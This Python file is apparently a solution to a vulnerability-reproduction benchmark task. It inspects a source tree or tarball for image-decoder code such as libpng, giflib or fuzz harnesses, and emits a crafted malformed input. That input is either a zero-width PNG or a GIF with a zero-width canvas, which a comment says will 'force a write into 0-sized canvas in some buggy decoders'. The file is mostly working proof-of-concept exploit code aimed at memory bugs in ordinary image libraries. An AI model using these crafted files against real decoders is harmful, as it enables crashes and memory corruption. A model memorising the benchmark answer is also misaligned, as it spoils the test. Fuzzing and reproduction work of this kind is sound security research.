import os
import re
import io
import tarfile
import struct
import zlib
import tempfile
from typing import Dict, Iterable, Tuple, Optional


def _png_chunk(chunk_type: bytes, data: bytes) -> bytes:
    crc = zlib.crc32(chunk_type)
    crc = zlib.crc32(data, crc) & 0xFFFFFFFF
    return struct.pack(">I", len(data)) + chunk_type + data + struct.pack(">I", crc)


def make_png_zero_width() -> bytes:
    w = 0
    h = 1
    sig = b"\x89PNG\r\n\x1a\n"
    ihdr = struct.pack(">II5B", w, h, 8, 0, 0, 0, 0)  # 8-bit grayscale
    raw = b"\x00" * h  # filter byte only (rowbytes==0)
    comp = zlib.compress(raw, 9)
    return sig + _png_chunk(b"IHDR", ihdr) + _png_chunk(b"IDAT", comp) + _png_chunk(b"IEND", b"")


def make_gif_zero_width_canvas() -> bytes:
    # Canvas width=0 height=1, image is 1x1 to force a write into 0-sized canvas in some buggy decoders
    header = b"GIF89a"
    canvas_w, canvas_h = 0, 1
    packed = 0xF0  # GCT flag=1, color resolution=7, sort=0, gct size=0 (2 colors)
    lsd = struct.pack("<HHBBB", canvas_w, canvas_h, packed, 0, 0)
    gct = b"\x00\x00\x00" + b"\xFF\xFF\xFF"
    gce = b"\x21\xF9\x04\x01\x00\x00\x00\x00"
    img_desc = b"\x2C" + struct.pack("<HHHHB", 0, 0, 1, 1, 0)
    # Minimal LZW for 1 pixel: min code size=2, data sub-block 2 bytes 0x4C 0x01, terminator
    img_data = b"\x02\x02\x4C\x01\x00"
    trailer = b"\x3B"
    return header + lsd + gct + gce + img_desc + img_data + trailer


_TEXT_EXTS = {
    ".c", ".cc", ".cpp", ".cxx", ".h", ".hpp", ".hh", ".inc",
    ".py", ".java", ".rs", ".go",
    ".txt", ".md", ".rst", ".cmake", ".in", ".m4", ".sh",
    ".yaml", ".yml", ".json", ".toml", ".bazel", ".bzl",
    ".mk", ".make", "makefile",
}


def _is_text_path(p: str) -> bool:
    pl = p.lower()
    base = os.path.basename(pl)
    if base == "makefile":
        return True
    _, ext = os.path.splitext(pl)
    return ext in _TEXT_EXTS


def _iter_files_from_tar(src_path: str) -> Iterable[Tuple[str, bytes]]:
    with tarfile.open(src_path, "r:*") as tf:
        for m in tf.getmembers():
            if not m.isfile():
                continue
            name = m.name
            if m.size <= 0:
                continue
            if m.size > 2_000_000:
                continue
            if not _is_text_path(name):
                continue
            f = tf.extractfile(m)
            if f is None:
                continue
            try:
                data = f.read(200_000)
            finally:
                f.close()
            yield name, data


def _iter_files_from_dir(src_dir: str) -> Iterable[Tuple[str, bytes]]:
    for root, _, files in os.walk(src_dir):
        for fn in files:
            p = os.path.join(root, fn)
            rel = os.path.relpath(p, src_dir)
            if not _is_text_path(rel):
                continue
            try:
                st = os.stat(p)
            except OSError:
                continue
            if st.st_size <= 0 or st.st_size > 2_000_000:
                continue
            try:
                with open(p, "rb") as f:
                    data = f.read(200_000)
            except OSError:
                continue
            yield rel, data


def _detect_format(src_path: str) -> str:
    scores: Dict[str, int] = {"png": 0, "gif": 0, "jpeg": 0, "tiff": 0, "webp": 0, "bmp": 0, "ico": 0, "avif": 0, "heif": 0}

    def add(fmt: str, pts: int) -> None:
        if fmt in scores:
            scores[fmt] += pts

    def score_name(name: str) -> None:
        nl = name.lower()
        if "fuzz" in nl or "fuzzer" in nl:
            base = 2
        else:
            base = 1
        if "png" in nl:
            add("png", 1 * base)
        if "gif" in nl:
            add("gif", 1 * base)
        if "jpeg" in nl or "jpg" in nl:
            add("jpeg", 1 * base)
        if "tiff" in nl or nl.endswith(".tif") or "tif" in nl:
            add("tiff", 1 * base)
        if "webp" in nl or "vp8" in nl:
            add("webp", 1 * base)
        if "bmp" in nl:
            add("bmp", 1 * base)
        if "ico" in nl or "icon" in nl:
            add("ico", 1 * base)
        if "avif" in nl:
            add("avif", 1 * base)
        if "heif" in nl:
            add("heif", 1 * base)
        if "dgif" in nl or "egif" in nl or "giflib" in nl:
            add("gif", 6 * base)
        if "pngread" in nl or "pngwrite" in nl or "libpng" in nl or "spng" in nl:
            add("png", 6 * base)

    def score_text(name: str, b: bytes) -> None:
        nl = name.lower()
        score_name(nl)

        try:
            s = b.decode("utf-8", "ignore").lower()
        except Exception:
            return

        is_harness = ("llvmfuzzertestoneinput" in s) or ("fuzz" in nl) or ("fuzzer" in nl)
        mult = 6 if is_harness else 1

        if "#include" in s:
            if "png.h" in s or "<png.h>" in s or "libpng" in s or "spng" in s:
                add("png", 12 * mult)
            if "gif_lib.h" in s or "<gif_lib.h>" in s or "giflib" in s:
                add("gif", 12 * mult)
            if "jpeglib.h" in s or "<jpeglib.h>" in s:
                add("jpeg", 10 * mult)
            if "tiffio.h" in s or "<tiffio.h>" in s:
                add("tiff", 10 * mult)

        if "dgifopen" in s or "dgifslurp" in s or "dgifgetimage" in s or "giflib" in s or "gif_lib.h" in s:
            add("gif", 18 * mult)
        if "png_read" in s or "pngread" in s or "png_get_" in s or "png_set_" in s or "spng_decode" in s or "spng_ctx" in s:
            add("png", 18 * mult)
        if "jpeg_read_header" in s or "jpeg_decompress" in s or "tjinitdecompress" in s:
            add("jpeg", 16 * mult)
        if "tiffopen" in s or "tiffread" in s:
            add("tiff", 16 * mult)
        if "webpdecode" in s or "webp" in s and ("decode" in s or "demux" in s):
            add("webp", 14 * mult)
        if "stbi_load" in s or "stbi_info" in s or "stb_image" in s:
            add("png", 4 * mult)
            add("gif", 4 * mult)
            add("jpeg", 4 * mult)
            add("bmp", 4 * mult)

        if re.search(r"\.png\b", s):
            add("png", 4 * mult)
        if re.search(r"\.gif\b", s):
            add("gif", 4 * mult)
        if re.search(r"\.(jpg|jpeg)\b", s):
            add("jpeg", 4 * mult)
        if re.search(r"\.(tif|tiff)\b", s):
            add("tiff", 4 * mult)

    if os.path.isdir(src_path):
        it = _iter_files_from_dir(src_path)
    else:
        it = _iter_files_from_tar(src_path)

    for name, data in it:
        score_text(name, data)

    # Prefer strong, specific evidence
    if scores["gif"] >= scores["png"] + 10 and scores["gif"] >= 20:
        return "gif"
    if scores["png"] >= scores["gif"] + 10 and scores["png"] >= 20:
        return "png"

    # Otherwise pick best supported among our generators
    best = max(scores.items(), key=lambda kv: kv[1])[0]
    if best in ("gif", "png"):
        return best
    return "png"


class Solution:
    def solve(self, src_path: str) -> bytes:
        fmt = _detect_format(src_path)
        if fmt == "gif":
            return make_gif_zero_width_canvas()
        return make_png_zero_width()